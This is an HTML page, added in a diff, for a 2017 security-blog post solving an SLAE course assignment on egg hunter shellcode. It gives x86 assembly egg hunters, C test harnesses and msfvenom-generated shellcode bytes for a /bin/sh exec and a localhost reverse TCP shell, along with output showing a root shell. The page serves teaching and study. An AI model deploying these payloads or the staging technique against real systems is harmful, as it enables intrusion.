@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      SLAE Assignment 3 - Egg hunter &middot; phackt.com:~#
+    
+  </title>
+
+  
+  <link rel="canonical" href="http://localhost:4000/slae-egg-hunter">
+  
+
+  <link rel="stylesheet" href="http://localhost:4000/public/css/poole.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/syntax.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/lanyon.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">
+
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/public/apple-touch-icon-precomposed.png">
+  <link rel="shortcut icon" href="http://localhost:4000/public/favicon.ico">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:4000/atom.xml">
+
+  
+</head>
+
+
+  <body>
+
+    <!-- Target for toggling the sidebar `.sidebar-checkbox` is for regular
+     styles, `#sidebar-checkbox` for behavior. -->
+<input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox" checked>
+
+<!-- Toggleable sidebar -->
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-item">
+    <p>Some infosec stuff.</p>
+  </div>
+
+  <nav class="sidebar-nav">
+    <a class="sidebar-nav-item" href="http://localhost:4000/">Home</a>
+
+    
+
+    
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+          <a class="sidebar-nav-item" href="http://localhost:4000/about">About</a>
+        
+      
+    
+      
+    
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+    
+      
+    
+
+    <a class="sidebar-nav-item" href="/archive/v1.1.0.zip">Download</a>
+    <a class="sidebar-nav-item" href="">GitHub project</a>
+    <span class="sidebar-nav-item">Currently v1.1.0</span>
+  </nav>
+
+  <div class="sidebar-item">
+    <p>
+      &copy; 2020. All rights reserved.
+    </p>
+  </div>
+</div>
+
+
+    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
+         content to avoid any CSS collisions with our real content. -->
+    <div class="wrap">
+      <div class="masthead">
+        <div class="container">
+          <h3 class="masthead-title">
+            <a href="/" title="Home">phackt.com:~#</a>
+            <small>Let's talk about sec, baby!</small>
+          </h3>
+        </div>
+      </div>
+
+      <div class="container content">
+        <div class="post">
+  <h1 class="post-title">SLAE Assignment 3 - Egg hunter</h1>
+  <span class="post-date">21 Apr 2017</span>
+  <p>Student <strong>SLAE - 891</strong><br />
+Github: <a href="https://github.com/phackt/slae">https://github.com/phackt/slae</a><br />
+<a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
+
+<p>Hello everybody,</p>
+
+<p>So here we are for the third part of our shellcodes serie. Today we will deal with the concept of egg hunter shellcode.<br />
+<!--more--></p>
+
+<h3 id="assignment-3">Assignment 3:</h3>
+
+<p>Code is available on my <a href="https://github.com/phackt/slae/tree/master/assignment3">github repo</a>.</p>
+
+<p><strong>Our Goal:</strong></p>
+<blockquote>
+  <p><em>Study about the egg hunter shellcode</em></p>
+  <ul>
+    <li><em>Create a working demo of the Egghunter</em></li>
+    <li><em>Should be configurable for different payloads</em></li>
+  </ul>
+</blockquote>
+
+<p>So what is an egg hunter and its related egg shellcode?</p>
+
+<p>While your exploiting buffer overflows, the shellcode you inject will face several constraints in order to properly execute, and the size limit is one of them. An idea is to stage the shellcode: the first stage will be a small shellcode looking for the effective and bigger second one.</p>
+
+<p>Here is a bit of litterature that may help to understand the egg hunter concept:<br />
+<a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf</a><br />
+<a href="http://duartes.org/gustavo/blog/post/anatomy-of-a-program-in-memory/">http://duartes.org/gustavo/blog/post/anatomy-of-a-program-in-memory/</a></p>
+
+<p>The above second link will provide a good overview of the Linux memory layout.  For this exercise, we will use an in-memory egg hunter shellcode.</p>
+
+<p>So let’s try with a first example:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">global</span>  <span class="nv">_start</span>
+
+<span class="nf">section</span> <span class="nv">.text</span>
+<span class="nl">_start:</span>
+
+    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nv">_start</span>             <span class="c1">; we set a valid .text address into eax</span>
+    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="kt">dword</span> <span class="mh">0x50905091</span>   <span class="c1">; we can avoid an 8 bytes tag in egg if the tag</span>
+    <span class="nf">dec</span> <span class="nb">ebx</span>                     <span class="c1">; can not be found in the egg hunter, that's why we decrement to look for </span>
+                                <span class="c1">; 0x50905090 - push eax, nop, push eax, nop</span>
+
+<span class="nl">next_addr:</span>
+
+    <span class="nf">inc</span> <span class="nb">eax</span>
+    <span class="nf">cmp</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">eax</span><span class="p">],</span> <span class="nb">ebx</span>        <span class="c1">; do we found the tag ?</span>
+    <span class="nf">jne</span> <span class="nv">next_addr</span>
+    <span class="nf">jmp</span> <span class="nb">eax</span>                     <span class="c1">; yes we do so we jump to the egg</span>
+
+</code></pre></div></div>
+
+<p><em>N.B: Our egg hunter on exploit-db: <a href="https://www.exploit-db.com/exploits/41909/">https://www.exploit-db.com/exploits/41909/</a>.</em></p>
+
+<p>Now let’s update <a href="https://github.com/phackt/slae/blob/master/assignment3/shellcode.c">shellcode.c</a>:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">egghunter</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="s">"</span><span class="se">\xb8\x60\x80\x04\x08\xbb\x91\x50\x90\x50\x4b\x40\x39\x18\x75\xfb\xff\xe0</span><span class="s">"</span><span class="p">;</span>
+
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">egg</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="s">"</span><span class="se">\x90\x50\x90\x50</span><span class="s">"</span> <span class="c1">// egg mark - do not remove</span>
+<span class="s">"</span><span class="se">\xbd\x64\xb2\x0c\xf4\xda\xc2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1</span><span class="s">"</span> <span class="c1">// msfvenom -p linux/x86/exec CMD=/bin/sh -f c -b \x00</span>
+<span class="s">"</span><span class="se">\x0b\x83\xc2\x04\x31\x6a\x11\x03\x6a\x11\xe2\x91\xd8\x07\xac</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xc0\x4f\x7e\x24\xdf\x0c\xf7\x53\x77\xfc\x74\xf4\x87\x6a\x54</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x66\xee\x04\x23\x85\xa2\x30\x3b\x4a\x42\xc1\x13\x28\x2b\xaf</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x44\xdf\xc3\x2f\xcc\x4c\x9a\xd1\x3f\xf2</span><span class="s">"</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Egg hunter shellcode Length:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">egghunter</span><span class="p">));</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Egg shellcode Length:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">egg</span><span class="p">));</span>
+
+	<span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">egghunter</span><span class="p">;</span>
+
+	<span class="n">ret</span><span class="p">();</span>
+
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Let’s run our egg hunter:  <br />
+<img src="http://localhost:4000/public/images/slae/assignment3/image1.png" alt="image1" /></p>
+
+<p>Perfect, but why did it work ?  In our shellcode.c the egg has been placed in the .data segment (global initialized variables). According to the following picture (anatomy of a program in memory), we can see that the .text, .data and .bss segments are contigous and readable:</p>
+
+<p><img src="http://localhost:4000/public/images/slae/assignment3/linuxflexibleaddressspacelayout.png" alt="linuxflexibleaddressspacelayout.png" /></p>
+
+<p>let’s check for our shellcode’s memory mapping in gdb:<br />
+<img src="http://localhost:4000/public/images/slae/assignment3/image2.png" alt="image2" /></p>
+
+<p><strong>1563</strong> is our shellcode process id:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cat /proc/1563/maps</span>
+08048000-08049000 r-xp 00000000 08:01 2885480    /root/Documents/pentest/certs/slae/exam/assignment3/shellcode
+08049000-0804a000 r-xp 00000000 08:01 2885480    /root/Documents/pentest/certs/slae/exam/assignment3/shellcode
+0804a000-0804b000 rwxp 00001000 08:01 2885480    /root/Documents/pentest/certs/slae/exam/assignment3/shellcode
+0804b000-0806c000 rwxp 00000000 00:00 0          <span class="o">[</span>heap]
+b7dfb000-b7fac000 r-xp 00000000 08:01 269855     /lib/i386-linux-gnu/libc-2.24.so
+b7fac000-b7fae000 r-xp 001b0000 08:01 269855     /lib/i386-linux-gnu/libc-2.24.so
+b7fae000-b7faf000 rwxp 001b2000 08:01 269855     /lib/i386-linux-gnu/libc-2.24.so
+b7faf000-b7fb2000 rwxp 00000000 00:00 0 
+b7fd3000-b7fd6000 rwxp 00000000 00:00 0 
+b7fd6000-b7fd9000 r--p 00000000 00:00 0          <span class="o">[</span>vvar]
+b7fd9000-b7fdb000 r-xp 00000000 00:00 0          <span class="o">[</span>vdso]
+b7fdb000-b7ffd000 r-xp 00000000 08:01 269850     /lib/i386-linux-gnu/ld-2.24.so
+b7ffe000-b7fff000 r-xp 00022000 08:01 269850     /lib/i386-linux-gnu/ld-2.24.so
+b7fff000-b8000000 rwxp 00023000 08:01 269850     /lib/i386-linux-gnu/ld-2.24.so
+bffdf000-c0000000 rwxp 00000000 00:00 0          <span class="o">[</span>stack]
+</code></pre></div></div>
+
+<p>Our three first segments are respectively the .text, .data, .bss segment. As we can see, we have no unreadable spaces between them. If a memory segment was unreadable, we would have had a segmentation fault (SIGSEGV - Signal Segmentation Violation).</p>
+
+<p>Let’s try now to place our egg shellcode in the heap space (we keep the same egg hunter):</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="cp">#define EGGMARK "\x50\x90\x50\x90"
+</span>
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">egghunter</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="s">"</span><span class="se">\xb8\x60\x80\x04\x08\xbb\x91\x50\x90\x50\x4b\x40\x39\x18\x75\xfb\xff\xe0</span><span class="s">"</span><span class="p">;</span>
+
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">egg</span><span class="p">[]</span> <span class="o">=</span> \
+<span class="n">EGGMARK</span>
+<span class="s">"</span><span class="se">\xbd\x64\xb2\x0c\xf4\xda\xc2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1</span><span class="s">"</span> <span class="c1">// msfvenom -p linux/x86/exec CMD=/bin/sh -f c -b \x00</span>
+<span class="s">"</span><span class="se">\x0b\x83\xc2\x04\x31\x6a\x11\x03\x6a\x11\xe2\x91\xd8\x07\xac</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\xc0\x4f\x7e\x24\xdf\x0c\xf7\x53\x77\xfc\x74\xf4\x87\x6a\x54</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x66\xee\x04\x23\x85\xa2\x30\x3b\x4a\x42\xc1\x13\x28\x2b\xaf</span><span class="s">"</span>
+<span class="s">"</span><span class="se">\x44\xdf\xc3\x2f\xcc\x4c\x9a\xd1\x3f\xf2</span><span class="s">"</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+
+	<span class="kt">char</span> <span class="o">*</span><span class="n">shellcode_heap</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">egg</span><span class="p">));</span> <span class="c1">// shellcode egg + egg mark</span>
+	<span class="n">memcpy</span><span class="p">(</span><span class="n">shellcode_heap</span><span class="p">,</span> <span class="n">egg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">egg</span><span class="p">));</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Egg hunter shellcode Length:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">egghunter</span><span class="p">));</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Egg shellcode Length:  %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode_heap</span><span class="p">));</span>
+
+	<span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">egghunter</span><span class="p">;</span>
+
+	<span class="n">ret</span><span class="p">();</span>
+
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Running and executing it:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ./shellcode_heap</span>
+Egg hunter shellcode Length:  18
+Egg shellcode Length:  74
+Erreur de segmentation
+</code></pre></div></div>
+
+<p>We met a segmentation violation because our egg hunter is facing a memory access violation.<br />
+However a technique consists in using the <strong>access</strong> system call that originally check users permissions for a file. Giving our memory address as the first argument, we will be able to check if a memory page is accessible. If not, the syscall will return EFAULT (14) into EAX:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int access(const char *pathname, int mode);
+</code></pre></div></div>
+
+<p>Syscall number:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define __NR_access 33
+</code></pre></div></div>
+
+<p>Dans /usr/include/asm-generic/errno-base.h:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define	EFAULT		14	/* Bad address */
+</code></pre></div></div>
+
+<p>We will go through the memory pages and parse each readable memory page in order to look for our egg shellcode.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># getconf PAGE_SIZE</span>
+4096
+</code></pre></div></div>
+
+<p>Here is what our new egg hunter looks like:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">global</span> <span class="nv">_start</span>
+ 
+<span class="nf">section</span> <span class="nv">.text</span>
+ 
+<span class="nl">_start:</span>
+
+        <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span>         <span class="c1">; ecx zeroed out</span>
+        <span class="nf">mul</span> <span class="nb">ecx</span>             <span class="c1">; clear eax, edx</span>
+
+ <span class="nl">next_page:</span>
+        <span class="nf">or</span> <span class="nb">bx</span><span class="p">,</span> <span class="mh">0xfff</span>        <span class="c1">; 0x1000 - 1 (4095)</span>
+        <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="kt">dword</span> <span class="mh">0x50905091</span>
+        <span class="nf">dec</span> <span class="nb">edi</span>
+
+<span class="nl">next_addr:</span>
+        <span class="nf">inc</span> <span class="nb">ebx</span>             <span class="c1">; +1 so we move to the next 4096 bytes (next page)</span>
+        <span class="nf">push</span> <span class="kt">byte</span> <span class="mh">0x21</span>      <span class="c1">; access syscall</span>
+        <span class="nf">pop</span> <span class="nb">eax</span>
+        <span class="nf">int</span> <span class="mh">0x80</span>
+ 
+        <span class="nf">cmp</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xf2</span>         <span class="c1">; check for EFAULT</span>
+        <span class="nf">je</span> <span class="nv">_start</span>            <span class="c1">; if EFAULT, we are going to the nextpage</span>
+        <span class="nf">cmp</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">ebx</span><span class="p">],</span> <span class="nb">edi</span> <span class="c1">; our egg mark</span>
+        <span class="nf">jne</span> <span class="nv">next_addr</span>        <span class="c1">; we are parsing the readable memory page</span>
+        <span class="nf">lea</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebx</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>     <span class="c1">; @ of the shellcode</span>
+        <span class="nf">jmp</span> <span class="nb">eax</span>
+</code></pre></div></div>
+
+<p>Replacing the egg hunter in our <a href="https://github.com/phackt/slae/blob/master/assignment3/shellcode_heap.c">shellcode_heap.c</a> with the above egg hunter shellcode, compiling and executing provides:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># gcc -fno-stack-protector -z execstack -o shellcode_heap shellcode_heap.c  &amp;&amp; ./shellcode_heap</span>
+Egg hunter shellcode Length:  34
+Egg shellcode Length:  74
+<span class="c"># id  </span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="c"># </span>
+</code></pre></div></div>
+
+<p>You can try with any egg shellcode you want and set it just after the EGG variable.  Let’s try with a TCP reverse shellcode:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c -b \x00</span>
+...
+unsigned char buf[] <span class="o">=</span> 
+<span class="s2">"</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">6d</span><span class="se">\x</span><span class="s2">ed</span><span class="se">\x</span><span class="s2">21</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">cf</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">33</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">b1"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">37</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">f4"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">14</span><span class="se">\x</span><span class="s2">ab</span><span class="se">\x</span><span class="s2">95</span><span class="se">\x</span><span class="s2">a8</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">93</span><span class="se">\x</span><span class="s2">ae</span><span class="se">\x</span><span class="s2">f5</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">c0"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">8c</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">af</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">15</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">f5</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">e4"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">a6</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">a7</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">ca</span><span class="se">\x</span><span class="s2">5e"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">82</span><span class="se">\x</span><span class="s2">fb</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">d4</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">a3</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">85</span><span class="se">\x</span><span class="s2">3a"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">de</span><span class="se">\x</span><span class="s2">22</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">46"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Let’s compile and execute shellcode_heap.c:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># gcc -fno-stack-protector -z execstack -o shellcode_heap shellcode_heap.c  &amp;&amp; ./shellcode_heap</span>
+Egg hunter shellcode Length:  34
+Egg shellcode Length:  99
+
+</code></pre></div></div>
+
+<p>In another windows:<br />
+<img src="http://localhost:4000/public/images/slae/assignment3/image4.png" alt="image4" /></p>
+
+<p>So in this article we just saw how to create a two-staged shellcode. One stage consists in injecting our effective payload (the biggest one) and the second one consists in a small hunter shellcode looking for the first one.</p>
+
+<p>Hope you enjoyed,<br />
+Don’t hesitate to comment and share.</p>
+
+<p><a href="https://twitter.com/phackt_ul">Phackt</a></p>
+
+</div>
+
+
+<div class="related">
+  <h2>Related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/git-secrets-exposed">
+            What solutions to prevent git leaks ?
+            <small>27 May 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/web-exposed-git-repositories">
+            Gathering some information from web exposed git repositories
+            <small>05 Aug 2018</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/play-with-permissive-cors">
+            Play with permissive CORS
+            <small>24 Dec 2017</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+      </div>
+    </div>
+
+
+    <!-- <label for="sidebar-checkbox" class="sidebar-toggle"></label> -->
+
+    <script src='/public/js/script.js'></script>
+ 
+  </body>
+</html>
